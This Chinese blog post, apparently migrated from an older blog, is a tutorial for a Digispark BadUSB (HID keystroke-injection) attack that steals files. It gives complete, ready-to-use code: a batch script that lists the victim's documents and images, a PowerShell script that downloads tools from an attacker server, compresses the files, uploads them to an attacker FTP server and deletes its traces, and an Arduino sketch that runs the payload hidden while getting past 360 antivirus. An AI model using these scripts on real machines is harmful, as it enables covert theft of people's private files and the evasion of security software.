@@ -1,0 +1,170 @@
+---
+title: "【HID攻击】360免杀方法-digispark利用PowerShell脚本进行文件窃取"
+date: '2019-04-06T20:20:05Z'
+tags:
+  - 旧博客内容
+  - 技术向
+updatedOn: '2019-04-06T20:20:05Z'
+raw_comment_count: '0'
+image: https://oss.192168123.xyz/image/old-fxblog-img/cover/fa92823efb8732e9b61a8ba6d063ad12.jpg
+---
+
+:::tip
+本文迁移自老博客，原始链接为 [https://blog.fxit.top/?p=1011](https://blog.fxit.top/?p=1011)
+:::
+
+前言
+
+本文是在m大的[https://www.freebuf.com/articles/100026.html](https://www.freebuf.com/articles/100026.html)基础上 进行 digispark代码的适配 以及 360的免杀处理，以弥补原教程的缺失，再次感谢m大提供的思路。
+
+本文对360免杀处理 以及 digispark的代码转换 为博主原创。
+
+本文对m大的文章进行整合修改，并加入digispark的适配以及360免杀的处理部分，以及提供文章提到的相关文件下载。
+
+<hr />
+
+## 准备工具
+一台外网主机(直接电脑接网线宽带拨号也可以)
+
+一个HID攻击工具(烧鹅或者Badusb)
+
+FTPserver(搭建一个FTP服务器用来接收窃取到的文件)
+
+PHPstudy(搭建http服务器用来存放ps脚本等)
+
+7z.exe / 7z.dll(存放到http服务器下,之后会利用它来进行压缩后在上传，尽量减小上传速度)
+
+PS：7z.exe以及7z.dll在文末下载。
+
+<hr />
+
+### 代码部分(以下代码可能具有攻击性,请勿用于非法用途)
+1.\[get.bat\](获取需要的文件存放位置，并保存到c:\temp.bat)[该代码存放于服务器http根目录下]
+
+<strong>博主PS：此处是寻找对应文件夹里面*.txt等文件类型后缀的文件，保存到c盘根目录的temp.bat。</strong>
+```
+dir /s /a /b "%userprofile%\desktop\*.txt"&gt;c:\temp.bat
+dir /s /a /b "%userprofile%\desktop\*.doc"&gt;&gt;c:\temp.bat
+dir /s /a /b "%userprofile%\desktop\*.docx"&gt;&gt;c:\temp.bat
+dir /s /a /b "%userprofile%\desktop\*.xls"&gt;&gt;c:\temp.bat
+dir /s /a /b "%userprofile%\desktop\*.xlsx"&gt;&gt;c:\temp.bat
+dir /s /a /b "%userprofile%\desktop\*.ppt"&gt;&gt;c:\temp.bat
+dir /s /a /b "%userprofile%\desktop\*.xls"&gt;&gt;c:\temp.bat
+dir /s /a /b "%userprofile%\desktop\*.eet"&gt;&gt;c:\temp.bat
+dir /s /a /b "%userprofile%\desktop\*.et"&gt;&gt;c:\temp.bat
+dir /s /a /b "%userprofile%\desktop\*.xlt"&gt;&gt;c:\temp.bat
+dir /s /a /b "%userprofile%\desktop\*.pdf"&gt;&gt;c:\temp.bat
+dir /s /a /b "%userprofile%\desktop\*.jpg"&gt;&gt;c:\temp.bat
+dir /s /a /b "%userprofile%\desktop\*.jpeg"&gt;&gt;c:\temp.bat
+dir /s /a /b "%userprofile%\desktop\*.png"&gt;&gt;c:\temp.bat
+dir /s /a /b "%userprofile%\desktop\*.bmp"&gt;&gt;c:\temp.bat
+dir /s /a /b "%userprofile%\desktop\*.gif"&gt;&gt;c:\temp.bat
+dir /s /a /b "%userprofile%\desktop\*.rtf"&gt;&gt;c:\temp.bat
+dir /s /a /b "%userprofile%\desktop\*.htl"&gt;&gt;c:\temp.bat
+dir /s /a /b "%userprofile%\Documents\Tencent Files\*.txt"&gt;&gt;c:\temp.bat
+dir /s /a /b "%userprofile%\Documents\Tencent Files\*.doc"&gt;&gt;c:\temp.bat
+dir /s /a /b "%userprofile%\Documents\Tencent Files\*.docx"&gt;&gt;c:\temp.bat
+dir /s /a /b "%userprofile%\Documents\Tencent Files\*.xls"&gt;&gt;c:\temp.bat
+dir /s /a /b "%userprofile%\Documents\Tencent Files\*.xlsx"&gt;&gt;c:\temp.bat
+dir /s /a /b "%userprofile%\Documents\Tencent Files\*.ppt"&gt;&gt;c:\temp.bat
+dir /s /a /b "%userprofile%\Documents\Tencent Files\*.xls"&gt;&gt;c:\temp.bat
+dir /s /a /b "%userprofile%\Documents\Tencent Files\*.eet"&gt;&gt;c:\temp.bat
+dir /s /a /b "%userprofile%\Documents\Tencent Files\*.et"&gt;&gt;c:\temp.bat
+dir /s /a /b "%userprofile%\Documents\Tencent Files\*.xlt"&gt;&gt;c:\temp.bat
+dir /s /a /b "%userprofile%\Documents\Tencent Files\*.pdf"&gt;&gt;c:\temp.bat
+dir /s /a /b "%userprofile%\Documents\Tencent Files\*.jpg"&gt;&gt;c:\temp.bat
+dir /s /a /b "%userprofile%\Documents\Tencent Files\*.jpeg"&gt;&gt;c:\temp.bat
+dir /s /a /b "%userprofile%\Documents\Tencent Files\*.png"&gt;&gt;c:\temp.bat
+dir /s /a /b "%userprofile%\Documents\Tencent Files\*.bmp"&gt;&gt;c:\temp.bat
+dir /s /a /b "%userprofile%\Documents\Tencent Files\*.gif"&gt;&gt;c:\temp.bat
+dir /s /a /b "%userprofile%\Documents\Tencent Files\*.rtf"&gt;&gt;c:\temp.bat
+dir /s /a /b "%userprofile%\Documents\Tencent Files\*.htl"&gt;&gt;c:\temp.bat
+```
+
+2.\[get.ps1\](清除运行记录，下载服务器中的7z.dll / 7z.exe / get.bat到c盘到相应位置,处理c:\temp.bat为7z压缩为c:\Ram.7z,上传c:\Ram.7z到FTP服务器根目录下,删除所有下载的文件!!!一共需要改4处IP地址!!!)[该代码存放于服务器http根目录下记得设置FTP服务器密码为admin admin]
+
+<strong>博主PS：此处是对刚刚寻找到的文件进行压缩并上传到你自己的服务器。</strong>
+```
+reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /f;
+
+(New-Object System.Net.WebClient).DownloadFile('http://192.168.1.1/7z.dll','c:\7z.dll');
+
+(New-Object System.Net.WebClient).DownloadFile('http://192.168.1.1/7z.exe','c:\7z.exe');
+
+(New-Object System.Net.WebClient).DownloadFile('http://192.168.1.1/get.bat','c:\Users\Public\get.bat');
+
+C:\Users\Public\get.bat;$array="";foreach($u in(get-content c:\temp.bat)){[array]$array +='c:\7z a -t7z c:\Ram.7z "'+$u+'"'};$array | Out-File -Encoding default c:\temp.bat;c:\temp.bat;
+
+$fileinf=New-Object System.Io.FileInfo("C:\Ram.7z");
+
+$ftp = [System.Net.FtpWebRequest] [System.Net.FtpWebRequest]::Create("ftp://192.168.1.1/"+$fileinf.name)
+
+$ftp.Method = [System.Net.WebRequestMethods+Ftp]::UploadFile
+
+$ftp.Credentials = new-object System.Net.NetworkCredential("admin","admin")
+
+$ftp.UseBinary = $true
+
+$ftp.UsePassive = $true
+
+$content = [System.IO.File]::ReadAllBytes($fileInf.fullname)
+
+$ftp.ContentLength = $content.Length
+
+$rs = $ftp.GetRequestStream()
+
+$rs.Write($content, 0, $content.Length)
+
+$rs.Close()
+
+$rs.Dispose()
+
+Remove-Item c:\temp.bat
+
+Remove-Item c:\Ram.*
+
+Remove-Item c:\7z.*
+
+Remove-Item c:\Users\Public\get.*
+```
+### （下条为博主修改过的原创内容！）
+3.\[get.ino\](以管理员权限下载get.ps1到本地c:\users\public目录!!!需要改1处IP地址!!!UAC闪过之后要记得拔出)[修改IP后直接刷入]
+```
+#include "DigiKeyboard.h"
+#define KEY_LEFT_SHIFT 0xE1
+#define KEY_LEFT_ALT 0xE1
+void setup() {
+DigiKeyboard.sendKeyStroke(0);
+DigiKeyboard.delay(5000);
+DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
+DigiKeyboard.delay(100);
+DigiKeyboard.sendKeyPress(KEY_LEFT_SHIFT);//按住左SHIFT，绕过输入法
+DigiKeyboard.println("POWERSHELL -NOP");
+DigiKeyboard.sendKeyPress(0);//松开
+DigiKeyboard.sendKeyStroke(KEY_ENTER);//按回车
+DigiKeyboard.delay(2000);
+DigiKeyboard.println("$clnt=new-object System.Net.WebClient;");//开始分part执行实现360免杀
+DigiKeyboard.println("$url='http://你上传的服务器域名/GET.ps1\';");
+DigiKeyboard.println("$file='C:\\USERS\\PUBLIC\\GET.PS1';");
+DigiKeyboard.println("$clnt.DownloadFile($url,$file);");
+DigiKeyboard.println("START-PROCESS POWERSHELL.exe \"C:\\USERS\\PUBLIC\\GET.PS1\" -WindowStyle Hidden");
+DigiKeyboard.println("exit");
+}
+
+void loop() {
+  DigiKeyboard.sendKeyPress(KEY_LEFT_ALT);
+  DigiKeyboard.sendKeyPress(KEY_LEFT_ALT);
+  DigiKeyboard.print("y");
+  DigiKeyboard.sendKeyPress(KEY_LEFT_ALT);
+  DigiKeyboard.sendKeyPress(KEY_LEFT_ALT);
+  DigiKeyboard.sendKeyPress(KEY_LEFT_ALT);
+  DigiKeyboard.sendKeyPress(KEY_LEFT_ALT);
+}
+```
+上面通过分part执行，以跳过360的弹窗提示。
+
+<hr />
+
+以上。
+
+相关文件下载链接在文末。
